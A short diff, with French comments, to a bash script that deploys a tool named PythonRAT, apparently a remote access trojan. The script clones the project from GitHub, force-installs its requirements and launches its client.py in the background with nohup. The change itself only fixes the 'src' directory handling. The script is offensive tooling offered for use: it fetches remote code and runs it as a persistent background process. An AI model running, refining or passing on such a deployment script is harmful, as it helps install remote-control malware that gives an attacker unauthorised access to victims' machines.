@@ -33,9 +33,17 @@ if [ $? -ne 0 ]; then
     confirm "Le téléchargement avec curl a échoué. Voulez-vous cloner le repo avec git?" && git clone https://github.com/tucommenceapousser/PythonRAT
     cd PythonRAT || exit
 
+    # Vérifier si le répertoire "src" existe déjà
+    if [ -d "src" ]; then
+        echo "Le répertoire 'src' existe déjà."
+    else
+        # Créer le répertoire "src" s'il n'existe pas
+        mkdir src
+    fi
+
     # Lancer le client.py
     confirm "Voulez-vous lancer client.py?" && python src/client.py
 else
     # Lancer le client.py téléchargé avec curl
-    confirm "Voulez-vous lancer client.py téléchargé avec curl?" && mkdir srcc && cp requirements.txt srcc/ && cp client.py srcc/ && pip install -r srcc/requirements.txt --force --use-feature=content-addressable-pool && nohup python srcc/client.py &
+    confirm "Voulez-vous lancer client.py téléchargé avec curl?" && mkdir src && cp requirements.txt src/ && cp client.py src/ && pip install -r src/requirements.txt --force --use-feature=content-addressable-pool && nohup python src/client.py &
 fi
